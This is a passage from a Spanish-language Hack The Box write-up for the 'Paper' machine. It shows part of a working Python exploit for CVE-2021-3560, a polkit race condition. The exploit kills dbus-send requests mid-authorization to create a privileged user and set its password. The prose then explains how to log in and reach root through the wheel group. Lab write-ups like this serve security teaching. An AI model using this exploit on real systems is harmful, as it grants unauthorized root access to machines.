    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Assigning password to user"</span><span class="p">);</span> <span class="n">inMagenta</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">default_user</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200</span><span class="p">):</span>
        <span class="c1"># start and kill the process until the password is created
</span>        <span class="c1"># extract UID from user
</span>        <span class="n">uid</span> <span class="o">=</span> <span class="s">"/org/freedesktop/Accounts/User"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pwd</span><span class="p">.</span><span class="n">getpwnam</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">default_user</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">pw_uid</span><span class="p">)</span>
        <span class="c1"># Create password in SHA-512 format
</span>        <span class="n">hash_passwd</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">f</span><span class="s">'openssl passwd -5 </span><span class="si">{</span><span class="n">default_password</span><span class="si">}</span><span class="s">'</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">).</span><span class="n">stdout</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
        <span class="n">passwd</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"string:</span><span class="si">{</span><span class="n">hash_passwd</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
        <span class="c1"># Assign password to user
</span>        <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">f</span><span class="s">'dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply </span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s"> org.freedesktop.Accounts.User.SetPassword </span><span class="si">{</span><span class="n">passwd</span><span class="si">}</span><span class="s"> string:"assign user passsword"'</span><span class="p">),</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">rand</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.006</span><span class="p">,</span> <span class="mf">0.009</span><span class="p">)</span>
            <span class="n">process</span><span class="p">.</span><span class="n">wait</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="n">rand</span><span class="p">)</span>
            <span class="n">process</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
        <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
            <span class="n">process</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n\t</span><span class="s">[*] Registered password"</span><span class="p">)</span>
    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n\t</span><span class="s">[*] Time out at:"</span><span class="p">);</span> <span class="n">inGreen</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rand</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># get credentials sudo
</span><span class="k">def</span> <span class="nf">getCredentials</span><span class="p">(</span><span class="n">default_user</span><span class="p">,</span> <span class="n">default_passwd</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Exploit Completed, log in to be root:</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[*] User :"</span><span class="p">);</span> <span class="n">inGreen</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">default_user</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[*] Password:"</span><span class="p">);</span> <span class="n">inGreen</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">default_passwd</span><span class="si">}</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># process
</span><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="n">default_user</span> <span class="o">=</span> <span class="s">'marss'</span>
    <span class="n">default_password</span> <span class="o">=</span> <span class="s">'marss###'</span>
    <span class="n">createUser</span><span class="p">(</span><span class="n">default_user</span><span class="p">)</span>
    <span class="n">assignPasswd</span><span class="p">(</span><span class="n">default_user</span><span class="p">,</span> <span class="n">default_password</span><span class="p">)</span>
    <span class="n">getCredentials</span><span class="p">(</span><span class="n">default_user</span><span class="p">,</span> <span class="n">default_password</span><span class="p">)</span>

<span class="c1"># main
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">run</span><span class="p">()</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># References
#------------------------------------------------------------------------------------
# https://github.com/innxrmxst/CVE-2021-3560/blob/main/ex.py
# https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html
</span></pre></table></code></div></div><p>Pueden clonar el script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/CVE-2021-3560_Paper/exploit.py">https://github.com/E1P0TR0</a></p><p>Una vez descargado solo tenemos que pasarla a la máquina víctima al igual que pasamos el <em>LinPEAS</em></p><p>El script consiste en que la herramienta <code class="language-plaintext highlighter-rouge">dbus-send</code> se encagará de crear un usuario por defecto <code class="language-plaintext highlighter-rouge">marss</code> y antes de que esa petición sea autorizada por el servicio <strong>polkit</strong> (verificando que el <em>UID</em> del proceso sea <em>0</em> -&gt; root), mataremos el proceso <code class="language-plaintext highlighter-rouge">kill</code> y repetiremos esta secuencia hasta que <strong>polkit</strong> al recibir una petición que ya no existe, entre en conflicto y envés de rechazar la petición, logre aceptar el proceso con un <em>UID = 0</em> y se cree el usuario con privilegios. Luego de ello repetiremos el proceso para asignarle una <em>contraseña válida</em> al usuario y ya poder logearnos:</p><p><img data-src="/assets/img/htb/writeups/paper/cve_process.png" alt="CVE-2021-3560" class="shadow" data-proofer-ignore></p><p>Logramos ver la credenciales, ahora solo nos logeamos con <code class="language-plaintext highlighter-rouge">su marss</code>, escribimos la contraseña <code class="language-plaintext highlighter-rouge">marss###</code>, nos volvemos root con <code class="language-plaintext highlighter-rouge">sudo su</code> y pa-dentro:</p><p><img data-src="/assets/img/htb/writeups/paper/root.png" alt="Root" class="shadow" data-proofer-ignore></p><blockquote class="prompt-warning"><div><p>Importante!</p></div></blockquote><blockquote><p>Que nos permite volvernos root?</p><p>La respuesta está en el grupo <code class="language-plaintext highlighter-rouge">wheel</code> al cúal pertencemos depues explotar la vulnerabilidad</p><p>Y… qué es el grupo Wheel?</p><p>Pues los miembros que pertenecen a este grupo tienen automáticamente privilegios <strong>sudo</strong></p></blockquote><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >Wordpress</a> <a href="/tags/x-backend-server/" class="post-tag no-text-decoration" >X-Backend-Server</a> <a href="/tags/cve-2019-17671/" class="post-tag no-text-decoration" >CVE-2019-17671</a> <a href="/tags/linpeas/" class="post-tag no-text-decoration" >LinPEAS</a> <a href="/tags/cve-2021-3560/" class="post-tag no-text-decoration" >CVE-2021-3560</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Paper - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBPaper/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Paper - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBPaper/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBPaper/&amp;text=Hackthebox Writeup Paper - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBOpensource/"><div class="card-body"> <em class="timeago small" data-ts="1656392833" > 2022-06-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Opensource</h3><div class="text-muted small"><p> Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) a...</p></div></div></a></div><div class="card"> <a href="/posts/HTBPhotobomb/"><div class="card-body"> <em class="timeago small" data-ts="1667426116" > 2022-11-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Photobomb</h3><div class="text-muted small"><p> Overview Http authentication credentials by Information leak in a server file Command Inyection by unsanitized user input on file download (Foothold) Path Hijacking to remote command execut...</p></div></div></a></div><div class="card"> <a href="/posts/HTBCozyhosting/"><div class="card-body"> <em class="timeago small" data-ts="1697648400" > 2023-10-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cozyhosting Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.230/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenS...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBUnicode/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Unicode</p></a> <a href="/posts/HTBTimelapse/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Timelapse</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
